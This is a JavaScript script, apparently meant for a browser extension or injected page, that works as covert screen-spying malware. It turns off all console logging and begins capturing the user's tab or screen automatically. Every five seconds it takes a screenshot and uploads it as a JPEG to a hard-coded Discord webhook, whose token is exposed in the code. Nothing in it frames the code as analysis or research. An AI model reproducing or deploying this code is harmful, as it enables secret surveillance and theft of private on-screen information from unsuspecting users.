(function() {
    'use strict';

    const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1528219381526564875/JWgIU-uAWRCM3Qufd8_ywazeG6CCtanAX0kIPJJfDZbxbYLvUUYNMdCtwUFvAju78m4_';
    const CAPTURE_INTERVAL = 5000;

    const noop = () => {};
    console.log = noop;
    console.warn = noop;
    console.error = noop;
    console.info = noop;
    console.debug = noop;

    let intervalId = null;
    let stream = null;

    async function captureScreen() {
        try {
            if (!stream) {
                // Usa chrome.tabCapture em vez de getDisplayMedia
                const constraints = {
                    video: true,
                    audio: false,
                    videoConstraints: {
                        mandatory: {
                            chromeMediaSource: 'tab',
                            chromeMediaSourceId: await getTabId()
                        }
                    }
                };

                stream = await navigator.mediaDevices.getUserMedia(constraints);
            }

            const video = document.createElement('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 1920;
                canvas.height = video.videoHeight || 1080;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
                sendToDiscord(dataUrl);
                video.pause();
                video.srcObject = null;
                video.remove();
            };
        } catch (e) {
            // Se falhar, fallback para getDisplayMedia
            try {
                const fallbackStream = await navigator.mediaDevices.getDisplayMedia({
                    video: { cursor: 'never' },
                    audio: false
                });
                stream = fallbackStream;
                // ... processa como antes
            } catch (e2) {}
        }
    }

    function getTabId() {
        return new Promise((resolve) => {
            chrome.tabCapture.getMediaStreamId({
                consumerTabId: chrome.tabs.getCurrent((tab) => {
                    resolve(tab.id);
                })
            });
        });
    }

    function sendToDiscord(imageData) {
        try {
            const formData = new FormData();
            formData.append('file', dataURLtoBlob(imageData), 'screenshot.jpg');
            fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData }).catch(noop);
        } catch (e) {}
    }

    function dataURLtoBlob(dataUrl) {
        const arr = dataUrl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        const n = bstr.length;
        const u8arr = new Uint8Array(n);
        for (let i = 0; i < n; i++) {
            u8arr[i] = bstr.charCodeAt(i);
        }
        return new Blob([u8arr], { type: mime });
    }

    function start() {
        if (intervalId) return;
        captureScreen();
        intervalId = setInterval(captureScreen, CAPTURE_INTERVAL);
    }

    function stop() {
        if (intervalId) {
            clearInterval(intervalId);
            intervalId = null;
        }
        if (stream) {
            stream.getTracks().forEach(t => t.stop());
            stream = null;
        }
    }

    window.addEventListener('beforeunload', stop);
    start();

    window._testing = { kill: stop, start: start };

})();
